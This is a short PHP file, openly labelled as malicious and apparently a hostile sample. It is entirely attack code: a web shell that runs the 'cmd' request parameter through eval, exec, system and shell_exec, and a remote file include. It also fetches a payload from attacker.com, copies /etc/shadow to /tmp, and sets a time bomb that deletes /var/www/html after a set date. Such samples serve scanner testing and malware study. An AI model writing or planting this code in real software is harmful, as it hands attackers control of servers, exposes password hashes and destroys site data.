<?php
// Malicious PHP code

// Code execution
if (isset($_GET['cmd'])) {
    eval($_GET['cmd']); // Code evaluation
    exec($_GET['cmd']); // Command execution
    system($_GET['cmd']); // System command
    shell_exec($_GET['cmd']); // Shell execution
}

// Remote file inclusion
if (isset($_GET['file'])) {
    include($_GET['file']); // Dynamic include
    file_get_contents("http://attacker.com/malware.php");
}

// Password stealing
function steal_passwords() {
    $passwords = file_get_contents('/etc/shadow');
    file_put_contents('/tmp/stolen.txt', $passwords);
}

// Time bomb
$trigger_date = strtotime('2024-12-31');
if (time() > $trigger_date) {
    exec('rm -rf /var/www/html');
}

// Bitcoin address
$bitcoin_wallet = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";

?>